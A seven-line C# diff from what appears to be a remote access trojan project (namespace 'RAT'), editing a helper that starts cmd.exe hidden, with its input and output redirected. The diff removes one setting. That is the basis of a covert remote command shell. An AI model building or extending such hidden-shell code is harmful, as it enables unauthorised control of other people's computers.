@@ -37,7 +37,6 @@ namespace RAT.src.Helpers
             {
                 FileName = "cmd.exe",
                 CreateNoWindow = true,
-                UseShellExecute = false,
                 RedirectStandardOutput = true,
                 RedirectStandardInput = true,
                 RedirectStandardError = true,
